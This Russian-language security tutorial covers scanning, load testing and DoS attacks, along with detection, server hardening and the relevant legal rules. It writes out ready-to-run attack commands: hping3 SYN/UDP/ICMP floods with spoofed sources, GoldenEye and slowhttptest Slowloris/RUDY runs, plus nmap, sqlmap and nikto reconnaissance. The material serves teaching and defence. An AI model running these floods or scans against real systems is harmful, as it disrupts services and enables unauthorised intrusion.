## **1. Методы сканирования (Scanning)**

**Сканирование** — процесс активного сбора информации о сети, хостах, сервисах и уязвимостях для анализа безопасности.

### **A. Сканирование портов (Port Scanning)**

| Метод                        | Принцип                                                                                 | Цель                                             | Обнаруживаемость                         |
| ---------------------------- | --------------------------------------------------------------------------------------- | ------------------------------------------------ | ---------------------------------------- |
| **TCP SYN Scan** (`-sS`)     | Отправка SYN-пакета. Ответ SYN/ACK — порт открыт, RST — закрыт. Не завершает handshake. | Определить открытые порты                        | Средняя (логируются попытки подключения) |
| **TCP Connect Scan** (`-sT`) | Полное установление TCP-соединения через системный вызов `connect()`.                   | То же, но без прав root                          | Высокая (полные соединения в логах)      |
| **TCP FIN Scan** (`-sF`)     | Отправка FIN-пакета. Закрытый порт ответит RST, открытый — проигнорирует.               | Обход простых фаерволов                          | Низкая (нестандартные пакеты)            |
| **TCP XMAS Scan** (`-sX`)    | Отправка пакета с флагами FIN, URG, PSH.                                                | Аналогично FIN scan                              | Низкая                                   |
| **TCP NULL Scan** (`-sN`)    | Отправка пакета без флагов.                                                             | Аналогично                                       | Низкая                                   |
| **UDP Scan** (`-sU`)         | Отправка UDP-пакета. Ответ ICMP "port unreachable" — порт закрыт. Медленный.            | Поиск UDP-сервисов (DNS, DHCP, SNMP)             | Средняя                                  |
| **ACK Scan** (`-sA`)         | Отправка ACK-пакета. Анализ TTL и window size.                                          | Определение правил фаервола (stateful/stateless) | Средняя                                  |
| **IDLE Scan** (`-sI`)        | Использование "зомби-хоста" для скрытия своего IP. Сложный, но анонимный.               | Полностью скрытое сканирование                   | Очень низкая                             |

**Примеры Nmap:**
```bash
# Быстрое сканирование топ-1000 портов
nmap -sS -T4 192.168.1.1

# Полное сканирование всех портов + определение ОС и версий
nmap -sS -sV -O -p- 192.168.1.1

# Скриптовое сканирование на уязвимости
nmap --script vuln 192.168.1.1

# UDP сканирование важных портов
nmap -sU -p 53,67,68,69,123,161 192.168.1.1
```

### **B. Сканирование сетей и хостов**

1.  **Ping Sweep:**
    ```bash
    # Использование nmap
    nmap -sn 192.168.1.0/24
    
    # Использование fping
    fping -a -g 192.168.1.0/24
    ```

2.  **Определение ОС (OS Fingerprinting):**
    ```bash
    nmap -O 192.168.1.1
    p0f -i eth0
    ```

3.  **Сканирование уязвимостей:**
    *   **Nessus** — коммерческий, мощный.
    *   **OpenVAS** — открытый аналог Nessus.
    *   **Nexpose** — от Rapid7.
    *   **Nikto** — для веб-серверов.

4.  **Веб-сканирование:**
    ```bash
    # Dirb для поиска директорий
    dirb http://target.com
    
    # Nikto для проверки уязвимостей
    nikto -h http://target.com
    
    # SQL injection сканирование
    sqlmap -u "http://target.com/page?id=1"
    ```

### **C. Пассивное сканирование**
*   **Анализ сетевого трафика:** Wireshark, tcpdump.
*   **Сбор информации из открытых источников (OSINT):**
    *   `whois`, `nslookup`, `dig`
    *   Shodan, Censys
    *   theHarvester: `theharvester -d domain.com -b google`

## **2. Нагрузочное тестирование (Load Testing)**

**Цель:** Проверить производительность системы под нагрузкой, определить пределы масштабируемости.

### **Виды нагрузочного тестирования:**

1.  **Load Test:** Тестирование под ожидаемой нагрузкой.
2.  **Stress Test:** Нагрузка выше нормальной для определения точки отказа.
3.  **Soak Test:** Длительное тестирование для выявления утечек памяти.
4.  **Spike Test:** Резкие скачки нагрузки.

### **Инструменты:**

#### **A. HTTP/HTTPS нагрузка:**
1.  **Apache JMeter:**
    *   Графический интерфейс, поддержка протоколов.
    *   Создание сложных сценариев (логин, переходы).
    ```bash
    jmeter -n -t testplan.jmx -l results.jtl
    ```

2.  **Gatling:**
    *   Высокая производительность, DSL на Scala.
    *   Подробные отчёты.
    ```scala
    // Пример сценария Gatling
    class BasicSimulation extends Simulation {
      val httpProtocol = http.baseUrl("http://target.com")
      val scn = scenario("Basic").exec(http("request").get("/"))
      setUp(scn.inject(atOnceUsers(1000)).protocols(httpProtocol))
    }
    ```

3.  **Locust:**
    *   На Python, пишется кодом.
    ```python
    from locust import HttpUser, task
    
    class WebsiteUser(HttpUser):
        @task
        def index(self):
            self.client.get("/")
    ```
    ```bash
    locust -f locustfile.py --host=http://target.com
    ```

4.  **wrk / wrk2:**
    *   Консольный, очень производительный.
    ```bash
    wrk -t12 -c400 -d30s http://target.com
    # 12 потоков, 400 соединений, 30 секунд
    ```

#### **B. Специализированные инструменты:**
*   **Siege:** `siege -c100 -t60s http://target.com`
*   **Tsung:** Для распределённого тестирования.
*   **k6:** Современный, с JavaScript.

#### **C. Базы данных:**
*   **sysbench:** `sysbench --test=oltp --mysql-host=... run`
*   **HammerDB**

#### **D. Сетевые протоколы:**
*   **iperf3:** Тестирование пропускной способности сети.
    ```bash
    # На сервере
    iperf3 -s
    
    # На клиенте
    iperf3 -c server_ip -t 60
    ```

### **Метрики нагрузочного тестирования:**
1.  **Throughput:** Количество запросов в секунду (RPS).
2.  **Response Time:** Время отклика (среднее, 95-й, 99-й процентиль).
3.  **Error Rate:** Процент ошибок.
4.  **Resource Utilization:** CPU, RAM, IO, сеть.
5.  **Concurrent Users:** Количество одновременных пользователей.

## **3. Атаки типа «Отказ в обслуживании» (DoS/DDoS)**

### **A. Классификация по уровням OSI:**

#### **Уровень 3-4 (Сетевой/Транспортный):**
1.  **SYN Flood:**
    ```bash
    hping3 -S --flood -p 80 target_ip
    # Использование случайных source IP
    hping3 -S --flood -p 80 --rand-source target_ip
    ```

2.  **UDP Flood:**
    ```bash
    hping3 --flood --udp -p 53 target_ip
    ```

3.  **ICMP Flood (Ping Flood):**
    ```bash
    hping3 --flood --icmp target_ip
    ping -f target_ip  # (Linux, требует root)
    ```

4.  **DNS/NTP Amplification:**
    *   Использование открытых серверов с большим коэффициентом усиления.
    *   **Запрос:** 60 байт → **Ответ:** 4000+ байт.

#### **Уровень 7 (Прикладной):**
1.  **HTTP Flood:**
    ```bash
    # GoldenEye
    python3 goldeneye.py http://target.com
    
    # Slowloris (медленная атака)
    slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://target.com
    
    # RUDY (длинные POST)
    slowhttptest -c 1000 -B -g -o rudy -i 100 -r 200 -s 8192 -t POST -u http://target.com/form
    ```

2.  **Slow Read Attack:**
    ```bash
    slowhttptest -c 1000 -X -r 1000 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://target.com
    ```

3.  **WebSocket/API Flood:**
    *   Атака на современные веб-приложения.

### **B. Инструменты для DoS-тестирования (Только в лабораторных условиях!):**

1.  **LOIC (Low Orbit Ion Cannon):**
    *   Графический, простой в использовании.

2.  **HOIC (High Orbit Ion Cannon):**
    *   Более продвинутый, с скриптами.

3.  **SlowHTTPTest:**
    ```bash
    # Slowloris
    slowhttptest -c 1000 -H -g -o results -i 10 -r 200 -t GET -u http://target
    
    # Slow POST
    slowhttptest -c 1000 -B -g -o results -i 110 -r 200 -s 8192 -t FAKEVERB -u http://target
    ```

4.  **DAVOSET:**
    *   Для атак через формы на сайтах.

### **C. Обнаружение и защита:**

#### **Обнаружение:**
1.  **Аномальная активность:**
    ```bash
    # Мониторинг сетевых соединений
    netstat -an | grep :80 | wc -l
    
    # Анализ трафика в реальном времени
    iftop -i eth0
    nload eth0
    
    # Количество SYN-пакетов
    tcpdump -i eth0 'tcp[13] & 2 != 0' | wc -l
    ```

2.  **Системы мониторинга:**
    *   Zabbix, Nagios с кастомными триггерами.
    *   Специализированные: Arbor Networks, Radware.

#### **Защита на Linux:**
```bash
# Защита от SYN Flood
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_max_syn_backlog=2048
sysctl -w net.ipv4.tcp_synack_retries=2

# Ограничение соединений с одного IP (iptables)
iptables -A INPUT -p tcp --syn -m connlimit --connlimit-above 50 -j DROP
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 60 --hitcount 20 -j DROP

# Rate limiting
iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 10 -j ACCEPT
iptables -A INPUT -p icmp -j DROP
```

#### **Защита веб-серверов:**
**Nginx:**
```nginx
http {
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    
    server {
        limit_conn addr 10;
        limit_req zone=one burst=20 nodelay;
        
        # Защита от медленных клиентов
        client_body_timeout 5s;
        client_header_timeout 5s;
        keepalive_timeout 5s;
    }
}
```

**Apache:**
```apache
# Модуль mod_evasive
<IfModule mod_evasive20.c>
    DOSHashTableSize    3097
    DOSPageCount        2
    DOSSiteCount        50
    DOSPageInterval     1
    DOSSiteInterval     1
    DOSBlockingPeriod   10
</IfModule>
```

### **D. Облачная защита:**
1.  **Cloudflare:** Бесплатный базовый уровень защиты.
2.  **AWS Shield:** Стандарт (бесплатно) и Advanced (платно).
3.  **Google Cloud Armor:** WAF с защитой от DDoS.
4.  **Azure DDoS Protection:** Basic (бесплатно) и Standard.

## **4. Юридические и этические аспекты**

### **Важно:**
1.  **Сканирование и тестирование разрешено ТОЛЬКО на:**
    *   Собственных системах.
    *   Системах с явного письменного разрешения владельца.
    *   Специальных лабораторных стендах.

2.  **Незаконные действия (УК РФ):**
    *   **Статья 272:** Неправомерный доступ к компьютерной информации.
    *   **Статья 273:** Создание, использование и распространение вредоносных программ.
    *   **Статья 274:** Нарушение правил эксплуатации ЭВМ.

3.  **Безопасное тестирование:**
    *   Использовать изолированные среды (VirtualBox, VMware).
    *   Тестировать на localhost или выделенных тестовых серверах.
    *   Всегда иметь письменное разрешение (Penetration Testing Agreement).

## **5. Практические примеры легального тестирования**

### **Пример 1: Полный цикл тестирования веб-приложения**
```bash
# 1. Пассивная разведка
theharvester -d domain.com -b google

# 2. Сканирование портов (на свой тестовый сервер!)
nmap -sS -sV -O testserver.local

# 3. Сканирование веб-уязвимостей
nikto -h http://testserver.local
dirb http://testserver.local

# 4. Нагрузочное тестирование
locust -f locustfile.py --host=http://testserver.local

# 5. Проверка защиты от Slowloris (на своем сервере!)
slowhttptest -c 500 -H -g -o results -i 10 -r 200 -t GET -u http://testserver.local
```

### **Пример 2: Создание тестового стенда**
1.  Установить VirtualBox.
2.  Развернуть Metasploitable 2 (уязвимая система).
3.  Развернуть Kali Linux (для тестирования).
4.  Настроить внутреннюю сеть между ними.
5.  Проводить все тесты только в этой изолированной среде.

**Итог:** Методы сканирования, нагрузочного тестирования и DoS-атак — это мощные инструменты, которые могут использоваться как для **защиты** (аудит безопасности, тестирование на устойчивость), так и для **атаки**. 

**Ключевые различия в целях:**
*   **Сканирование (для защиты):** Поиск уязвимостей для их устранения.
*   **Нагрузочное тестирование:** Проверка производительности и устойчивости.
*   **DoS-тестирование:** Проверка систем защиты и лимитов.

Все действия должны проводиться **только в легальных целях** и на системах, на которые у вас есть **явное разрешение**. Знание этих методов необходимо специалистам по информационной безопасности для построения эффективной защиты.
